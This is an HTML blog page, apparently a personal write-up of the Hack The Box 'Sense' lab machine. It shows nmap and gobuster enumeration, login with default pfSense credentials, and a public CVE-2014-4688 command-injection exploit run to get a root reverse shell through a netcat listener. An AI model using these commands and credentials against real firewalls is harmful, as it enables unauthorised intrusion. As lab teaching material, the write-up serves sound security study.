@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Sense - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Sense"><a href="#Hack-The-Box-Sense" class="headerlink" title="Hack The Box - Sense"></a>Hack The Box - Sense</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access. Its IP address is <code>10.10.10.60</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/sense/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/sense)
+ |
+ |-->{SFire129}#nmap -sC -sV 10.10.10.60
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 19:52 EDT
+ Nmap scan report for 10.10.10.60
+ Host is up (0.098s latency).
+ Not shown: 998 filtered ports
+ PORT    STATE SERVICE    VERSION
+ 80/tcp  open  http       lighttpd 1.4.35
+ |_http-server-header: lighttpd/1.4.35
+ |_http-title: Did not follow redirect to https://10.10.10.60/
+ |_https-redirect: ERROR: Script execution failed (use -d to debug)
+ 443/tcp open  ssl/https?
+ |_ssl-date: TLS randomness does not represent time
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 114.20 seconds<br></figure></pre>
+ <p>The output show the http service on port 80 and 443, with the gobuster, enumerate some folders.
+ <img src="/images/hackthebox/exploit/sense/1.png" alt=""></p>
+ <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>Launch the Gobuster for find directories and files.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/sense)
+ |
+ |-->{SFire129}#gobuster dir --url https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -x .txt,.php,.bak
+ ===============================================================
+ Gobuster v3.0.1
+ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+ ===============================================================
+ [+] Url:            https://10.10.10.60/
+ [+] Threads:        10
+ [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+ [+] Status codes:   200,204,301,302,307,401,403
+ [+] User Agent:     gobuster/3.0.1
+ [+] Extensions:     php,bak,txt
+ [+] Timeout:        10s
+ ===============================================================
+ 2020/06/04 20:24:46 Starting gobuster
+ ===============================================================
+ /index.php (Status: 200)
+ /help.php (Status: 200)
+ /themes (Status: 301)
+ /stats.php (Status: 200)
+ /css (Status: 301)
+ /edit.php (Status: 200)
+ /includes (Status: 301)
+ /license.php (Status: 200)
+ /system.php (Status: 200)
+ /status.php (Status: 200)
+ /javascript (Status: 301)
+ /changelog.txt (Status: 200)
+ /classes (Status: 301)
+ /exec.php (Status: 200)
+ /widgets (Status: 301)
+ /graph.php (Status: 200)
+ /tree (Status: 301)
+ /wizard.php (Status: 200)
+ /shortcuts (Status: 301)
+ /pkg.php (Status: 200)
+ /installer (Status: 301)
+ /wizards (Status: 301)
+ /xmlrpc.php (Status: 200)
+ /reboot.php (Status: 200)
+ /interfaces.php (Status: 200)
+ /csrf (Status: 301)
+ /system-users.txt (Status: 200)
+ /filebrowser (Status: 301)<br></figure></pre>
+ <p>In the web browser look the directories, changelog.txt file show information about security patches.
+ <img src="/images/hackthebox/exploit/sense/2.png" alt=""></p>
+ <p>The file system-users.txt show information about system users, <code>rohit</code> is the username.
+  <img src="/images/hackthebox/exploit/sense/2.1.png" alt=""></p>
+  <p>The default password for this firewall is <code>pfsense</code>.
+ <img src="/images/hackthebox/exploit/sense/3.png" alt=""></p>
+ <p>The version firmware is 2.1.3, which is vulnerable <code>CVE-2014-4688</code>, this vulnerabilty talk about the command injection  in status_rrd_graph_img.php. More info <code>https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/</code>
+  <p>For exploit this vulnerability, enter to status_rrd_graph_img.php file, and run burpsuite, for capture the traffic.
+ <img src="/images/hackthebox/exploit/sense/4.png" alt=""></p>
+ <p>Open image, for read url.
+ <img src="/images/hackthebox/exploit/sense/5.png" alt=""></p>
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+  <p>Send to repeater section the data.
+ <img src="/images/hackthebox/exploit/sense/6.png" alt=""></p>
+ <p>With the netcat listener, send commands.
+ <img src="/images/hackthebox/exploit/Sense/7.png" alt=""></p>
+ <p>Send <code>whoami</code>command.
+ <img src="/images/hackthebox/exploit/Sense/8.png" alt=""></p>
+<p>Search exploit pfsense. 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/sense)
+|
+|-->{SFire129}#searchsploit pfsense
+------------------------------------------ ----------------------------------------
+ Exploit Title                            |  Path
+                                          | (/usr/share/exploitdb/)
+------------------------------------------ ----------------------------------------
+pfSense - 'interfaces.php?if' Cross-Site  | exploits/hardware/remote/35071.txt
+pfSense - 'pkg.php?xml' Cross-Site Script | exploits/hardware/remote/35069.txt
+pfSense - 'pkg_edit.php?id' Cross-Site Sc | exploits/hardware/remote/35068.txt
+pfSense - 'status_graph.php?if' Cross-Sit | exploits/hardware/remote/35070.txt
+pfSense - (Authenticated) Group Member Re | exploits/unix/remote/43193.rb
+pfSense 2 Beta 4 - 'graph.php' Multiple C | exploits/php/remote/34985.txt
+pfSense 2.0.1 - Cross-Site Scripting / Cr | exploits/php/webapps/23901.txt
+pfSense 2.1 build 20130911-1816 - Directo | exploits/php/webapps/31263.txt
+pfSense 2.2 - Multiple Vulnerabilities    | exploits/php/webapps/36506.txt
+pfSense 2.2.5 - Directory Traversal       | exploits/php/webapps/39038.txt
+pfSense 2.3.1_1 - Command Execution       | exploits/php/webapps/43128.txt
+pfSense 2.3.2 - Cross-Site Scripting / Cr | exploits/php/webapps/41501.txt
+pfSense 2.4.1 - Cross-Site Request Forger | exploits/php/remote/43341.rb
+pfSense 2.4.4-P3 - 'User Manager' Persist | exploits/freebsd/webapps/48300.txt
+pfSense 2.4.4-p1 (HAProxy Package 0.59_14 | exploits/php/webapps/46538.txt
+pfSense 2.4.4-p1 - Cross-Site Scripting   | exploits/multiple/webapps/46316.txt
+pfSense 2.4.4-p3 (ACME Package 0.59_14) - | exploits/php/webapps/46936.txt
+pfSense < 2.1.4 - 'status_rrd_graph_img.p | exploits/php/webapps/43560.py
+pfSense Community Edition 2.2.6 - Multipl | exploits/php/webapps/39709.txt
+pfSense Firewall 2.2.5 - Config File Cros | exploits/php/webapps/39306.html
+pfSense Firewall 2.2.6 - Services Cross-S | exploits/php/webapps/39695.txt
+pfSense UTM Platform 2.0.1 - Cross-Site S | exploits/freebsd/webapps/24439.txt
+------------------------------------------ ----------------------------------------
+Shellcodes: No Result$<br></figure></pre>
+ <p>The output shown the <code>pfSense < 2.1.4 - 'status_rrd_graph_img.p | exploits/php/webapps/43560.py</code>, copy to current directoty, run the netcat listener on port 1234 and run the exploit.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/sense)
+ |
+ |-->{SFire129}#python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.27 --lport 1234 --username rohit --password pfsense
+ CSRF token obtained
+ Running exploit...
+ Exploit completed<br></figure></pre>
+ <p>The reverse connection with netcat listener, show the root privileges.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/sense)
+ |
+ |-->{SFire129}#nc -nvlp 1234
+ listening on [any] 1234 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.60] 18662
+ sh: can't access tty; job control turned off
+ # id
+ uid=0(root) gid=0(wheel) groups=0(wheel)<br></figure></pre>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+
+<pre><figure class="highlight plain"> # pwd
+ /var/db/rrd
+ # cd /home
+ # ls
+ .snap
+ rohit
+ # cd rohit
+ # cat user.txt
+ ***Here you could be find the user flag***
+ # cat /root/root.txt
+ ***Here you could be find the root flag***
+ #</figure></pre>
+
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-05</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#FreeBSD</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#PFSense</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
